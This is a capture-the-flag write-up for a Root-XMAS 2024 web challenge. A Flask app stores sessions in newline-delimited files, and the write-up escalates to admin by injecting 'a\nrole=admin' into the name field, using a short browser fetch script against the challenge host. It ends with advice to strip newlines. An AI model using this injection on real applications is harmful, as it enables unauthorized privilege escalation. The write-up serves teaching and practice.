---
title: Root-XMAS 2024 Day 15 - New new .. always new
feed: show
permalink: /RootXMAS_2024_15
date: 15-12-2024
summary: line up for new challenges
---
### summary

A simple challenge exploiting credentials file poisoning by adding newlines to user input.
### recon

We arrive on an "under construction" website where the only thing we can do is download sources.

We have a simple python web server, with an API to register, login, access a dashboard and of course an "admin" panel. Of course we cannot create an admin user... legitimately!

if we skim trough the code, we see that an [SQLAlchemy](https://www.sqlalchemy.org/) database is used.

```python
db = SQLAlchemy(app)
...
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    email = db.Column(db.String(120), unique=True, nullable=False)
	...

def register():
	...
	user = User(email=email, name=name, role='user', password_hash=password_hash)
    db.session.add(user)
    db.session.commit()
...
def login():
	...
    user = User.query.filter_by(email=email).first()
    if user and check_password_hash(user.password_hash, password):
        session_id = create_session(user.email, user.name, user.role)
        response = make_response(jsonify(success="Logged in successfully"))
...
```

OK, so we see a pretty sensible usage of a database, without any apparent injection vulnerability, strange... but wait, what is this `create_session()` function?

```python
def create_session(email, name, role):
	...
    with open(session_file, 'w') as f:
        f.write(f'email={email}\n')
        f.write(f'role={role}\n')
        f.write(f'name={name}\n')
```

So we write user input to a file... and I guess we read it back?

```python
def load_session(session_id):
	...
	with open(session_file, 'r') as f:
        for line in f:
            key, value = line.strip().split('=')
            session_data[key] = value
    return session_data


@app.route('/admin')
def admin():
	...
    session_data = load_session(session_id)


```

Why store data in the db *and* on files? No reason apart from creating vulnerabilities! 
### solution

User input is written directly to the session file, and then this file is read line by line to get session information, like tu user role. The hint was "New new"... newlines?
What if we write a name like `tuxlu\nrole=admin`, we would have a session file like this:

```python
email=a@mail.test
role=user
name=tuxlu
role=admin
```

and the server will overwrite the role with the last "admin" line!

Let's script it, in JS from the browser to change a bit.

```js
headers = { "Content-Type": "application/json" }

await fetch("https://day15.challenges.xmas.root-me.org/register", {
    "headers": headers,
    "body": '{ "email": "aaaaa", "name": "a\\nrole=admin", "password": "aa"}',
    "method": "POST",
});

await fetch("https://day15.challenges.xmas.root-me.org/login", {
    "headers": headers,
    "body": '{ "email": "aaaaa", "password": "aa"}',
    "method": "POST",
});

res = await fetch("https://day15.challenges.xmas.root-me.org/admin");
rt = await res.text()
console.log(rt)
```

```
{"success":"Welcome back admin! Here is the flag: 
RM{I_Thought_Th1s_VUlnerab1ility_W4s_N0t_Imp0rtant}"}
```


Always strip newlines and special characters, even if you don't use files for critical data as user credentials, it can still mess up things, like Log Poisoning!